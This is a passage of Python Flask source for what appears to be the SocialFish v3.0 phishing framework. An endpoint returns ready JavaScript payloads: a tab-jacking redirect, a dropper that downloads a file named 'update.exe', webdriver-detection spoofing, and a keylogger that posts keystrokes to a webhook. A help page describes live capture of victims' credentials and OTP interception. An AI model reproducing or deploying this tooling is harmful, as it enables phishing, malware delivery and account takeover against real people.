                    'message': 'Webhook test timed out after 10 seconds',
                    'webhook_url': webhook_url
                }), 408
            except requests.exceptions.ConnectionError as e:
                logger.warning(f"[WEBHOOK] Connection error for {webhook_url}: {e}")
                return jsonify({
                    'status': 'error',
                    'message': f'Connection error: {str(e)}',
                    'webhook_url': webhook_url
                }), 503
            except Exception as e:
                logger.error(f"[WEBHOOK] Error sending test: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': f'Webhook test failed: {str(e)}',
                    'webhook_url': webhook_url
                }), 500
        except Exception as e:
            logger.error(f"[WEBHOOK] Unexpected error in test: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # Attack Payload Generation - Generate attack payloads
    @app.route("/api/generate-payload", methods=['POST'])
    @flask_login.login_required
    def generate_payload():
        """Generate attack payloads for injection"""
        try:
            data = request.get_json() or {}
            payload_type = data.get('type', 'tabjack')  # tabjack, file_upload, stealth, captcha
            
            payloads = {
                'tabjack': """
// Tab Jacking Payload
window.parent.location = 'CLONE_URL_HERE';
                """,
                'file_upload': """
// File Upload Dropper
var xhr = new XMLHttpRequest();
xhr.open('GET', 'FILE_URL_HERE', true);
xhr.responseType = 'blob';
xhr.onload = function() {
    var a = document.createElement('a');
    a.href = URL.createObjectURL(xhr.response);
    a.download = 'update.exe';
    a.click();
};
xhr.send();
                """,
                'stealth': """
// Anti-Detection Stealth Code
Object.defineProperty(navigator, 'webdriver', {get: () => false});
Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                """,
                'keylogger': """
// Advanced Keylogger
var keys = '';
document.addEventListener('keydown', function(e) {
    keys += String.fromCharCode(e.keyCode);
    if(keys.length > 50) {
        fetch('/api/keys-webhook', {
            method: 'POST',
            body: JSON.stringify({keys: keys}),
            headers: {'Content-Type': 'application/json'}
        });
        keys = '';
    }
});
                """
            }
            
            payload = payloads.get(payload_type, payloads['stealth'])
            
            logger.info(f"[PAYLOAD] Generated {payload_type} payload")
            
            return jsonify({
                'status': 'ok',
                'payload_type': payload_type,
                'payload': payload,
                'size': len(payload),
                'description': f'{payload_type.upper()} injection payload'
            })
        except Exception as e:
            logger.error(f"[PAYLOAD] Error generating payload: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # Database Backup Endpoint - Automatic backup
    @app.route("/api/backup-now", methods=['POST'])
    @flask_login.login_required
    def backup_database():
        """Trigger manual database backup"""
        try:
            import shutil
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_file = f"database.db.backup_{timestamp}"
            shutil.copy('database.db', backup_file)
            
            backup_size = os.path.getsize(backup_file)
            
            logger.info(f"[BACKUP] Database backed up to {backup_file} ({backup_size} bytes)")
            
            return jsonify({
                'status': 'ok',
                'backup_file': backup_file,
                'size_bytes': backup_size,
                'timestamp': timestamp
            })
        except Exception as e:
            logger.error(f"[BACKUP] Error creating backup: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    # Settings Endpoint - Admin settings management
    @app.route("/settings", methods=['GET', 'POST'])
    @flask_login.login_required
    def admin_settings():
        """Admin settings page"""
        if request.method == 'GET':
            cur = g.db
            # Get current settings
            config = cur.execute("SELECT * FROM config LIMIT 1").fetchone()
            
            settings = {
                'url': config[1] if config else 'http://localhost:5000',
                'redirect': config[2] if config else 'http://localhost:5000',
                'status': config[3] if config else 'custom',
                'beef': config[4] if config else 'no'
            }
            
            return render_template('admin/settings.html', settings=settings)
        
        elif request.method == 'POST':
            cur = g.db
            
            # Update settings
            url = request.form.get('url', 'http://localhost:5000')
            redirect_url = request.form.get('redirect', 'http://localhost:5000')
            status = request.form.get('status', 'custom')
            beef = request.form.get('beef', 'no')
            force_https = request.form.get('force_https', '0')
            
            cur.execute("DELETE FROM config")
            cur.execute("""INSERT INTO config(url, red, status, beef) 
                           VALUES(?, ?, ?, ?)""",
                        (url, redirect_url, status, beef))
            g.db.commit()
            
            logger.info(f"[SETTINGS] Updated by {flask_login.current_user.id}")
            
            return jsonify({'status': 'ok', 'message': 'Settings updated'})

    # Help/Documentation Endpoint
    @app.route("/help", methods=['GET'])
    @flask_login.login_required
    def help_page():
        """Display help documentation"""
        help_content = {
            'recording_studio': 'Record and clone websites with browser automation (Playwright/Selenium)',
            'live_panel': 'Monitor credentials in real-time as victims submit forms',
            'otp_panel': 'Intercept and inject OTP codes to victims via WebSocket',
            'templates': 'Save and manage cloned website templates for reuse',
            'webhooks': 'Configure webhooks for real-time notifications',
            'sessions': 'View captured victim sessions and activities',
            'attack_payloads': 'Generate and deploy advanced attack payloads',
            'reports': 'Generate comprehensive test reports'
        }
        
        return render_template('admin/help.html', help_content=help_content)

    # ================================================================================================================================

    print("SocialFish v3.0 - Social Engineering Framework")
    print("="*60)
    print(f"Admin Panel: http://localhost:5000/neptune")
    print(f"Username: {users[argv[1]].get('username', argv[1])}")
    print("="*60 + "\n")
    
    try:
        socketio.run(
            app,
            host='0.0.0.0',
            port=5000,
            debug=False,
            use_reloader=False,
            log_output=True,
            allow_unsafe_werkzeug=True
        )
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user")
        exit(0)